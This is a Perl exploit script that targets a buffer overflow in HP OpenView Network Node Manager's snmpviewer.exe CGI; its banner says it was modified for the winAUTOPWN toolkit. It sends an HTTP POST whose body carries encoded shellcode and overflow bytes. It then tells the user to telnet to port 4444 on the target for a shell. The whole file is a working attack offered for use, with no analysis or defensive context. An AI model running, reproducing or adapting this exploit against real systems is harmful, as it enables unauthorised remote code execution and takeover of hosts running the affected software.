#!/usr/bin/perl -w

use strict;
use IO::Socket;

#my $host = '127.0.0.1';
#my $port = 80;
my $host   = $ARGV[0];
my $port   = int($ARGV[1]);

print "HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow Exploit.\n\n";
print "Modified by QUAKERDOOMER for winAUTOPWN\n";


#my $sock = IO::Socket::INET->new("${host}: ${port}") || die $!;
my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"$port") or die "Could not connect to host.\n\n";

my $req = 'app=%89%e2%db%db%d9r%f4Y%83%e9%f7IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLKXLIC0EPEPE0MYKUP1IBCTLKV2VPLKV2TLLKPREDLKCBQ8TOOGQZGVVQKOVQO0NLGLE1CLC2VLQ0IQXOTMEQXGKRZPPRQGLKQBTPLKG2GLC1N0LKQPT8MUIPCDPJC1XPV0LKPHEHLKPXGPEQXSZCGLQYLKP4LKEQIFP1KOP1IPNLIQXOTMC1O7P8KPRUZTC3CMZXGKCMGTRUM2QHLKQHQ4C1N3RFLKTLPKLKV8ELEQICLKETLKEQN0LIG4Q4Q4QKQKE1PYPZPQKOKPV8QOQJLKEBZKLFQME8GCGBEPEPE8CGCCP2QOV4E8PLCGQ6C7KOIEX8LPEQEPC0Q9O4V4PPRHGYMPRKEPKOIEV0PPV0V0G0PPG0V0RHZJTOIOM0KON5LIIWVQIKPSCXTBEPTQQLK9KVCZR0V6PWE8IRIKP7E7KOXUQCQGE8X7M9P8KOKOIEPSQCV7E8T4ZLGKM1KOIEQGMYO7RHRURNPMCQKOXUCXRCRME4EPK9ZCPWPWQGP1KFRJTRV9QFZBKME6O7G4GTGLC1EQLMPDQ4TPXFC0G4PTV0PVPVQFPFV6PNPVQFV3QFCXCIXLGOLFKOIEK9M0PNV6G6KOP0RHC8K7EME0KOXUOKZPNUI2PVCXNFLUOMMMKOIEGLEVCLTJMPKKKPCEEUOKG7ECT2ROCZC0V3KOIEAAA%88%b6s%8c%3aP%ac%b93%aa8wKi%96%98%b0%dd%b6%f8%b0f%8a%29%af%09%27%7cH%ad%92%8b%8eY%dd%a9%d7%b7%af%f9%f7%fd%adZ%3b%b4D%d3FB%24m%ec%df%9b%91%fcb%bcc%96E%f37%a5%3f%a9%23%b4%fb%9a%90%94V%a9R%d1%99%b7Q%c8%a7%87%85%83%80%90%85%bdy%f6%84Z%e52%97s%9azv%3d%22%f7%84%bb%e8j%95ULS%8cW%8e2%ef%ffJ%cdz%c4%f91s%cb%8b%c0%ec%d0%8a%a4%a5%eb%3d%7c%e7U%f8%ec%f8%bc%3bkX%8d%afPV%bb%ea%da%9e%90%27%2c%acNUBH%9e%23%c4%f0%df%8e%a7%f7%8d%c2%28%fe%d70%ce%86%f0D%d5%a5U%d3%85%7b%24%f3%fd%c2%ed%c1GeB%be%b7%ff%b3q%a8%8aOQH%d7%22%ca%be%d7%dcz%aa%e7G%baH%cf%b8%b6%25d%ec%5f%b0%86%ab%afb%2a%84f%e1%e0Zuae%8b%9c%e2Y%3fHh%ffJ.%82%bf%bd%db%f7%d3L%f1j%e6E%97%89%28RP%c4%94i%9c%a4%bc%d1%ab%bc%a5%5ft%aa%cf%a9%8b2z%aad%d9%f0%9e%e4%f5B%c1%28%f0%096%e0X.%ed%b2%d1%3f%cb%d5%c6%c8%9d%c2x%27%20%95%c5%ff%85%7d2%29fL%ca%ed%e8K%92%baW%b8%f7%3aQ%d9%c0%e1%b7%c0%22%cf%df%20%cc%20%a0%ea%c2%81%de%ec%fc\SH9%a8%cd%80L%a0\%e8f%b3%99l%a3%93%e9%9d%fb%ff%ff%eb%f9I%98%a7%8b%23Z&ins=load&act=%94b%bd\%c9%ef%7b%c3%b1%b0%b04%b8%22%deT%a7%e2%baq%8a%91%95mADs%b0%c7%b2OuEm%fa%80%e6l%7b%95%b8%8d%23%b7u%dcY%b9%dbY%a5%de%29%86%ef%91%cc%df%c7%cc3%f3M%a1%f5%ba%edj%c6%a6%8d%d5%23%85%baw%f6%94s%f2%9f%e51Ma%89y%d5%5f%8aq%98B%27%fc%5f%25%d54h%bf%96%9b%b7%3d%c9%b0%d0%e6%c6EvO%dc%b4I%f7%ef%bd%2a%e7%d6%d0%b4%c9%86%94%0aU%a9%e4%aeqQgro%bd%2a%b5%e8%b9Mg/%fe%caP%e5%2c%f8V%28%a81U%903%fc%ae%0aN%7c%81%fdQ%e0I%e0D%c7%9d%c8%cc%d6%dc0%23%20L%fcQM%9c%e8%a3k%e6%b7%fb%e7%3d%cek%abG%ab%2a%f2rQb%bb%3f%3b%25X%86%c57%a2%e4S%c1%91s%24C%ed%b86%8e%d0%afS%ae%d3U%c2%df%8f%9c%99I%98%9d%c4%29/Bb%cc%da%89h%9c5%8eb%2a%883%e8%f8%b9%f9%2b\%25%8dWHVd%aa%cd%bf%28%d1W3%84%86%bf%7d%c8%24%e3%d2%3bf%5f%bd%9f%a58%9c%bd%e2%83%09%9c%c6%7cxZ%85Xy%eer%b2%8al%c5%b5D%5f%d6UzaV%cb%d3%e4%b8E%9a%94%cd%f7X%d2%f5%e6ct%ee%8f%f7%aa%92%ea%fae%e6eni%82W%af%3bZbjme-%97s%90%23%84%aeQ%ec%93t%e1%20%93%f7JS%83%28%aa%25N%d6%a9%83d%87%ec%20%27%90%5f%ba%5f%2ab%ac%ea%c2%9a%7dA%f9m2/%f6%2bWF%c7%cb%b6%c5u%c2%a9%a8%7c%95Yh%ec%c3%c8z%d0%d0%f7m%93m%2c%40%7b%9d%83%7d%b6RU%93%99TGV-%d0%f1ovue%a6%3d%cfy%fb6%29e%b4d%f4%83%d7%b3uQ%c7%a4%85S%943%c7%88J%c9%0aW%c7%85%c0%97X%bdC%25%80%85%ed.%83%acAv%7d%b4%bd%9e%dcv%ab%2c\u%d2%d3%9a%bc%aaHac%5f%fc%2bW%d9i%b5%b5i%a3%d3%98%95%adU%28%ccz%f4K%b8%20D5i%fef%cc%28%c18%29GSCx%ad%d4%c8a%d75%98%fc%29%c3g%a3o%870I%7c%288%7b%cb%9b%ec%c6%bd%a2%9fi%a2%9csK%ed%824%b3W%b2%e1H%25%b8%7df7%fae%b7%db%fd%bc%81%b0%d2%23%c6P%c98W2%cfK%af7%feM%f8%f6%d0%a2m%97%20I%ff%295%8d%e9%20q14%d4Vg%83%f6w%bc%cd%a9%b4%c3%9d%95%e0%ca%cal%81-7%aa%d42%c8%09%9c%b2%ef%7c%e6%8d%3a%88%e0L%ea%f4%29c%98%d8%cc%85%c1%a3z%d8h%c8%bc%baLF%223%a4%d8E%7bbM5%9a%f1%e7%f1%94%9c%d7%bc%890pp%ad%e0%a1%a5%83K%bc%c6%29%e3%3f%e4%95%81%0a%d46%9e7%27%e1%87%a8%f6h%2b%85%ea%c8%99%dbG%2b%3b%cf%c3%f5%85%cb%f6%8agNn%f5P%ae%8a7%fas%fb%23%29r%bb8%dc%b2%c7td%81%e9%f5%ad%ef%9a%86OQ%8b%fb0nR%bdO%c4%a1T%bbM7%dc%cd%5f%7b%09%eeDD%f1d%8dG%87%40%9c%d0%ac%c5%f5%7c%ef%d4%c7\%beG%d8%2bT%22t%9c%e4XQ%90%dd%b70%93X%aa%fd%f5T%2bj%fdbm%a3%93%23%edJ%ec%e7%f8%aa%25k%f9Wcj%2b%d5%b9%dc%a5v%b6f%d1%d1%9cZ%ee%e4C%a0%fb%5f%97%c7%9f%a7%98%da%9b%f4%e1%87%93%daO%d8%7d%cd%8a%e9b%84%d74%27%cb%f6yo.%f7q%0arI7%82%ac9%b5%95%3d%8a%a9%99i%f5%fb%5f%c1%2b%8eW%a45%b8%e7%b3%d3%a9%b3S%e5%e3%96%f1%27%9b%f5%8e%80%9eAbV%e9%d5Z%e5%9b6Q%f5%96%e1%40%ed%90%a6%fc%c94S%f3%dc%93%d8%9c%7c%3aV%d9P%99%81%f4%2cg%c8%bc%e2%d6%ceB%b9%f4C%a8%9a%80%9f%eb%97%81%29%f8%93%c4%f7v%2c%831%80%ab%e0%a0%eaM%5fp%ab%f1%7cF%f1D%2c%931%9e%f6%9d%fdg82%ec%bc%95%3d';

print $sock "POST /OvCgi/snmpviewer.exe HTTP/1.1\r\n";
print $sock "Host: ", $host, "\r\n";
print $sock "Content-type: application/x-www-form-urlencoded\r\n"; 
print $sock "Content-length: ", length $req, "\r\n\r\n";
print $sock $req, "\r\n\r\n";

#print while <$sock>;

close $sock;
print "Telnet to Target on port 4444 for shell if lucky\n\n";




